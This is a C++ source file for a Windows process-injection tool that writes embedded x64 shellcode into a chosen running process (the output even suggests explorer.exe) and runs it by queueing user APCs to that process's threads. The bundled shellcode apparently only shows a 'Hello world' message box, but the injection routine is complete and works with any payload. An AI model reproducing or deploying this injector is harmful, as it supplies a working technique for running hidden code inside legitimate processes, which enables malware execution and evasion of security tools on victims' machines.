#include <iostream>
#include <windows.h>
#include <tlhelp32.h>

#define THREAD_INJECTION_LIMIT 2

// Spawns a MessageBox
unsigned char shellcode[] = \
"\x48\x83\xEC\x28\x48\x83\xE4\xF0\x48\x8D\x15\x66\x00\x00\x00"
"\x48\x8D\x0D\x52\x00\x00\x00\xE8\x9E\x00\x00\x00\x4C\x8B\xF8"
"\x48\x8D\x0D\x5D\x00\x00\x00\xFF\xD0\x48\x8D\x15\x5F\x00\x00"
"\x00\x48\x8D\x0D\x4D\x00\x00\x00\xE8\x7F\x00\x00\x00\x4D\x33"
"\xC9\x4C\x8D\x05\x61\x00\x00\x00\x48\x8D\x15\x4E\x00\x00\x00"
"\x48\x33\xC9\xFF\xD0\x48\x8D\x15\x56\x00\x00\x00\x48\x8D\x0D"
"\x0A\x00\x00\x00\xE8\x56\x00\x00\x00\x48\x33\xC9\xFF\xD0\x4B"
"\x45\x52\x4E\x45\x4C\x33\x32\x2E\x44\x4C\x4C\x00\x4C\x6F\x61"
"\x64\x4C\x69\x62\x72\x61\x72\x79\x41\x00\x55\x53\x45\x52\x33"
"\x32\x2E\x44\x4C\x4C\x00\x4D\x65\x73\x73\x61\x67\x65\x42\x6F"
"\x78\x41\x00\x48\x65\x6C\x6C\x6F\x20\x77\x6F\x72\x6C\x64\x00"
"\x4D\x65\x73\x73\x61\x67\x65\x00\x45\x78\x69\x74\x50\x72\x6F"
"\x63\x65\x73\x73\x00\x48\x83\xEC\x28\x65\x4C\x8B\x04\x25\x60"
"\x00\x00\x00\x4D\x8B\x40\x18\x4D\x8D\x60\x10\x4D\x8B\x04\x24"
"\xFC\x49\x8B\x78\x60\x48\x8B\xF1\xAC\x84\xC0\x74\x26\x8A\x27"
"\x80\xFC\x61\x7C\x03\x80\xEC\x20\x3A\xE0\x75\x08\x48\xFF\xC7"
"\x48\xFF\xC7\xEB\xE5\x4D\x8B\x00\x4D\x3B\xC4\x75\xD6\x48\x33"
"\xC0\xE9\xA7\x00\x00\x00\x49\x8B\x58\x30\x44\x8B\x4B\x3C\x4C"
"\x03\xCB\x49\x81\xC1\x88\x00\x00\x00\x45\x8B\x29\x4D\x85\xED"
"\x75\x08\x48\x33\xC0\xE9\x85\x00\x00\x00\x4E\x8D\x04\x2B\x45"
"\x8B\x71\x04\x4D\x03\xF5\x41\x8B\x48\x18\x45\x8B\x50\x20\x4C"
"\x03\xD3\xFF\xC9\x4D\x8D\x0C\x8A\x41\x8B\x39\x48\x03\xFB\x48"
"\x8B\xF2\xA6\x75\x08\x8A\x06\x84\xC0\x74\x09\xEB\xF5\xE2\xE6"
"\x48\x33\xC0\xEB\x4E\x45\x8B\x48\x24\x4C\x03\xCB\x66\x41\x8B"
"\x0C\x49\x45\x8B\x48\x1C\x4C\x03\xCB\x41\x8B\x04\x89\x49\x3B"
"\xC5\x7C\x2F\x49\x3B\xC6\x73\x2A\x48\x8D\x34\x18\x48\x8D\x7C"
"\x24\x30\x4C\x8B\xE7\xA4\x80\x3E\x2E\x75\xFA\xA4\xC7\x07\x44"
"\x4C\x4C\x00\x49\x8B\xCC\x41\xFF\xD7\x49\x8B\xCC\x48\x8B\xD6"
"\xE9\x14\xFF\xFF\xFF\x48\x03\xC3\x48\x83\xC4\x28\xC3";

int wmain(int argc, wchar_t **argv) {
    if (argc < 2) {
        std::wcout << "USAGE: " << argv[0] << " <proc_name>" << std::endl;
        return 1;
    }

    std::wcout << "[+] Getting list of active processes..." << std::endl;

    // Creating ToolHelp32 to search through all the processes
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        std::wcout << "[-] Error in getting list of active processes" << std::endl;
        return 1;
    }

    PROCESSENTRY32 procEntry;
    procEntry.dwSize = sizeof(PROCESSENTRY32);

    // Searching for the process whose name is pointed by argv[1]
    // By default, if it doesn't find it, the process chosen will be the injector itself
    std::wcout << "[+] Trying to find " << argv[1] << " in the list..." << std::endl;
    for (auto proc = Process32First(hSnapshot, &procEntry); proc; proc = Process32Next(hSnapshot, &procEntry)) {
        if (!lstrcmpW(argv[1], procEntry.szExeFile)) {
            break;
        }
    }

    if (!lstrcmpW(argv[1], procEntry.szExeFile)) {
        std::wcout << "[+] Found process " << procEntry.szExeFile << " with PID " << procEntry.th32ProcessID << std::endl;
    }
    else {
        std::wcout << "[~] No process " << argv[1] << " found. Why not try explorer.exe?" << std::endl;
        return 1;
    }

    CloseHandle(hSnapshot);

    HANDLE hProcess = NULL;
    SIZE_T lpNumberOfBytesWritten;

    // Opening process pointed by procEntry.th32ProcessID
    std::wcout << "[+] Opening chosen process..." << std::endl;
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, procEntry.th32ProcessID);
    if (hProcess == INVALID_HANDLE_VALUE) {
        std::wcout << "[-] Error opening process " << procEntry.th32ProcessID << std::endl;
        return 1;
    }


    // Allocating memory in remote process
    std::wcout << "[+] Allocating " << sizeof(shellcode) << " bytes in remote process.." << std::endl;
    LPVOID allocatedMem = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!allocatedMem) {
        std::wcout << "[-] Error in allocating memory" << std::endl;
        return 1;
    }


    // Writing shellcode to allocated memory
    std::wcout << "[+] Writing shellcode at 0x" << std::hex << allocatedMem << std::endl;
    BOOL status = WriteProcessMemory(hProcess, allocatedMem, shellcode, sizeof(shellcode), &lpNumberOfBytesWritten);
    if (!status) {
        std::wcout << "[-] Error in writing shellcode" << std::endl;
        return 1;
    }


    // List all threads in all processes
    std::wcout << "[+] Getting list of all threads in the system..." << std::endl;
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        std::wcout << "[-] Error in getting list of active threads" << std::endl;
        return 1;
    }

    THREADENTRY32 threadEntry;
    threadEntry.dwSize = sizeof(THREADENTRY32);

    // Finally, call QueueUserAPC to the main thread
    std::wcout << "[+] Getting list of active threads in target process..." << std::endl;

    unsigned int i = 0;
    for (auto thread = Thread32First(hSnapshot, &threadEntry); thread && i < THREAD_INJECTION_LIMIT; thread = Thread32Next(hSnapshot, &threadEntry)) {
        if (threadEntry.th32OwnerProcessID == procEntry.th32ProcessID) {
            // Code for queueing APC to main thread
            HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, 0, threadEntry.th32ThreadID);
            if (!hThread) {
                std::wcout << "[-] Failed opening thread " << threadEntry.th32ThreadID << std::endl;
                continue;
            }
            
            std::wcout << "[+] Queueing APC for thread " << threadEntry.th32ThreadID << "..." << std::endl;
            QueueUserAPC((PAPCFUNC)allocatedMem, hThread, NULL);
            i++;
        }

    }
}
